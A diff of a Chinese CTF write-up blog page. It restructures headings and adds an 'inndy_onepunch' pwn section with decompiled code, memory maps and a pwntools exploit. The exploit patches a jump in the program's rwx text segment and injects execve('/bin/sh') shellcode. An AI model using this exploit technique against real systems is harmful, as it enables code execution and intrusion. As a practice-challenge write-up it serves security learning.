@@ -303,13 +303,10 @@
     <li><a href="#tsgctf-closed_ended">tsgctf-closed_ended</a></li>
     <li><a href="#sokoban_game">sokoban_game</a></li>
     <li><a href="#black-watch-入群题pwn2">[Black Watch 入群题]PWN2</a></li>
-    <li><a href="#浙江省赛初赛">浙江省赛初赛</a>
-      <ol>
-        <li><a href="#pwn1">pwn1</a></li>
-        <li><a href="#re1">re1</a></li>
-        <li><a href="#pwn2">pwn2</a></li>
-      </ol>
-    </li>
+    <li><a href="#浙江省赛初赛-pwn1">浙江省赛初赛-pwn1</a></li>
+    <li><a href="#浙江省赛初赛-re1">浙江省赛初赛-re1</a></li>
+    <li><a href="#浙江省赛初赛-pwn2">浙江省赛初赛-pwn2</a></li>
+    <li><a href="#inndy_onepunch">inndy_onepunch</a></li>
   </ol>
 </nav>
         </div>
@@ -366,7 +363,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 64 分钟
+                    阅读时长: 66 分钟
                 </time>
             </div>
         
@@ -7379,9 +7376,8 @@
 </span></span><span class="line"><span class="cl"><span class="c1">#这个就是伪造的堆块</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="浙江省赛初赛">浙江省赛初赛
-</h2><h3 id="pwn1">pwn1
-</h3><div class="highlight"><div class="chroma">
+</div><h2 id="浙江省赛初赛-pwn1">浙江省赛初赛-pwn1
+</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -7612,8 +7608,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="re1">re1
-</h3><div class="highlight"><div class="chroma">
+</div><h2 id="浙江省赛初赛-re1">浙江省赛初赛-re1
+</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -7859,8 +7855,8 @@
 </span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="pwn2">pwn2
-</h3><div class="highlight"><div class="chroma">
+</div><h2 id="浙江省赛初赛-pwn2">浙江省赛初赛-pwn2
+</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -8043,7 +8039,227 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="inndy_onepunch">inndy_onepunch
+</h2><p>这个题目是第二次遇到的一个手法这里我们尝试进行一个分析这里我们先看保护和ida</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h] BYREF
+</span></span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">v6</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Where What?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%llx %d&#34;</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">255</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No flag for you&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>这里是保护上面是ida的反编译的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/fofa/onepunch&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:      Canary found
+</span></span><span class="line"><span class="cl">    NX:         NX enabled
+</span></span><span class="line"><span class="cl">    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Stripped:   No
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们可以知道我们有一个canary，同时没有pie什么的因此我们这里使用的思路也是非常简单，同时在一个函数里面找到了一个shellcode的位置，把这个空间变成了rwx，这里的函数在下面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="nf">_</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">sys_mprotect</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">loc_4006D1</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000LL</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mi">7u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时我们可以知道我们的数据可以看看vmmap调用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; vmmap
+</span></span><span class="line"><span class="cl">LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> WX <span class="p">|</span> RODATA
+</span></span><span class="line"><span class="cl">             Start                End Perm     Size Offset File
+</span></span><span class="line"><span class="cl">          0x400000           0x401000 rwxp     <span class="m">1000</span>      <span class="m">0</span> /home/fofa/onepunch
+</span></span><span class="line"><span class="cl">          0x600000           0x601000 r--p     <span class="m">1000</span>      <span class="m">0</span> /home/fofa/onepunch
+</span></span><span class="line"><span class="cl">          0x601000           0x602000 rw-p     <span class="m">1000</span>   <span class="m">1000</span> /home/fofa/onepunch
+</span></span><span class="line"><span class="cl">        0x3618b000         0x361ac000 rw-p    <span class="m">21000</span>      <span class="m">0</span> <span class="o">[</span>heap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0be00000     0x728a0be28000 r--p    <span class="m">28000</span>      <span class="m">0</span> /usr/lib/x86_64-linux-gnu/libc.so.6
+</span></span><span class="line"><span class="cl">    0x728a0be28000     0x728a0bfb0000 r-xp   <span class="m">188000</span>  <span class="m">28000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
+</span></span><span class="line"><span class="cl">    0x728a0bfb0000     0x728a0bfff000 r--p    4f000 1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
+</span></span><span class="line"><span class="cl">    0x728a0bfff000     0x728a0c003000 r--p     <span class="m">4000</span> 1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
+</span></span><span class="line"><span class="cl">    0x728a0c003000     0x728a0c005000 rw-p     <span class="m">2000</span> <span class="m">202000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
+</span></span><span class="line"><span class="cl">    0x728a0c005000     0x728a0c012000 rw-p     d000      <span class="m">0</span> <span class="o">[</span>anon_728a0c005<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0c02b000     0x728a0c02e000 rw-p     <span class="m">3000</span>      <span class="m">0</span> <span class="o">[</span>anon_728a0c02b<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0c041000     0x728a0c043000 rw-p     <span class="m">2000</span>      <span class="m">0</span> <span class="o">[</span>anon_728a0c041<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0c043000     0x728a0c047000 r--p     <span class="m">4000</span>      <span class="m">0</span> <span class="o">[</span>vvar<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0c047000     0x728a0c049000 r-xp     <span class="m">2000</span>      <span class="m">0</span> <span class="o">[</span>vdso<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    0x728a0c049000     0x728a0c04a000 r--p     <span class="m">1000</span>      <span class="m">0</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">    0x728a0c04a000     0x728a0c075000 r-xp    2b000   <span class="m">1000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">    0x728a0c075000     0x728a0c07f000 r--p     a000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">    0x728a0c07f000     0x728a0c081000 r--p     <span class="m">2000</span>  <span class="m">36000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">    0x728a0c081000     0x728a0c083000 rw-p     <span class="m">2000</span>  <span class="m">38000</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">    0x7ffc1b3be000     0x7ffc1b3df000 rw-p    <span class="m">21000</span>      <span class="m">0</span> <span class="o">[</span>stack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xffffffffff600000 0xffffffffff601000 --xp     <span class="m">1000</span>      <span class="m">0</span> <span class="o">[</span>vsyscall<span class="o">]</span>
+</span></span><span class="line"><span class="cl">pwndbg&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们就可以非常清楚的数据存在一个rwx，同时他的shellcode的地址是在我们的程序段里面，因此我们可以尝试使用修改程序段的位置来进行一个攻击。</p>
+<p>因此我们的思路非常清晰：</p>
+<p>​	1.我们修改jz代码改到b4上，进行再一次上传</p>
+<p>​	2.我们修改完在这个位置后我们直接完成了一个死循环，</p>
+<p>​	3.写入一个shellcode，并且使用0xff进行一个运行，修改puts</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;/home/fofa/onepunch&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">patch</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Where What?&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Step 1: patch cyclic&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">patch</span><span class="p">(</span><span class="mh">0x400768</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Step 2: write shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400769</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">patch</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Step 3: goto shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">patch</span><span class="p">(</span><span class="mh">0x400768</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>小总结一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000400756</span> <span class="err">028</span> <span class="err">48</span> <span class="err">8</span><span class="nf">B</span> <span class="mi">45</span> <span class="no">F0</span>                   <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000040075</span><span class="nf">A</span> <span class="mi">028</span> <span class="mi">8</span><span class="no">B</span> <span class="mi">55</span> <span class="no">E8</span>                      <span class="no">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000040075</span><span class="nf">D</span> <span class="mi">028</span> <span class="mi">88</span> <span class="mi">10</span>                         <span class="no">mov</span>     <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">dl</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000040075</span><span class="nf">F</span> <span class="mi">028</span> <span class="mi">8</span><span class="no">B</span> <span class="mi">45</span> <span class="no">E8</span>                      <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="no">var_18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000400762</span> <span class="err">028</span> <span class="err">3</span><span class="nf">D</span> <span class="no">FF</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>                <span class="no">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span><span class="no">FFh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000400767</span> <span class="err">028</span> <span class="err">75</span> <span class="err">0</span><span class="nf">A</span>                         <span class="no">jnz</span>     <span class="no">short</span> <span class="no">loc_400773</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000400767</span>
+</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000000000400769</span> <span class="err">028</span> <span class="nf">BF</span> <span class="mi">28</span> <span class="mi">08</span> <span class="mi">40</span> <span class="mi">00</span>                <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">s</span>                   <span class="c1">; &#34;No flag for you&#34;
+</span></span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">000000000040076</span><span class="nf">E</span> <span class="mi">028</span> <span class="no">E8</span> <span class="no">ED</span> <span class="no">FD</span> <span class="no">FF</span> <span class="no">FF</span>                <span class="no">call</span>    <span class="no">_puts</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在我们使用机器码的时候我们可以控制机器码的跳转位可以控制到读入的位置，改的位置就是68的位置，在这里可以看到他的偏移时0a到这里我们改到b4上</p>
+
 </section>
 
 
@@ -8069,7 +8285,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 helios
+            2025 - 
+        
+        2026 helios
     </section>
     
     <section class="powerby">
